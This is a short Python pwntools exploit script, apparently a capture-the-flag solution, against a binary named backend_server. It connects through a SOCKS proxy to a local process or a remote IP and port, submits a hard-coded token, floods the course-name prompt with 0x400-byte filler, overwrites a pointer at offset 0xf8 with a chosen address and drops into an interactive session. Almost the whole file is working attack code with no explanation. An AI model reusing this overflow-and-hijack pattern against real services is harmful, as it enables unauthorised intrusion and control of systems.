#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Copyright © 2018 hzshang <hzshang15@gmail.com>

from pwn import *
context.log_level="debug"
pwn_file="./backend_server"

elf=ELF(pwn_file)
context.proxy=(socks.SOCKS5, '10.211.55.2',1080)

if len(sys.argv)==1:
    conn=process(pwn_file)
    pid=conn.pid
else:
    conn=remote("178.128.84.72",9997)
    pid=0

def debug():
    log.debug("process pid:%d"%pid)
    pause()

conn.sendafter("Token> ","0ce1bf6c7a23d0c0dfe80c0cc3bb06c85e0e97e90fbe63a973df5e590fc0321e\x00")

for i in range(3):
    conn.sendafter("What is the course name?>","a"*0x400)
debug()
f={
    0xf8:p64(0x604070),
}
conn.sendafter("?>",fit(f,filler="\x00"))
conn.sendlineafter("> ","3")
conn.interactive()
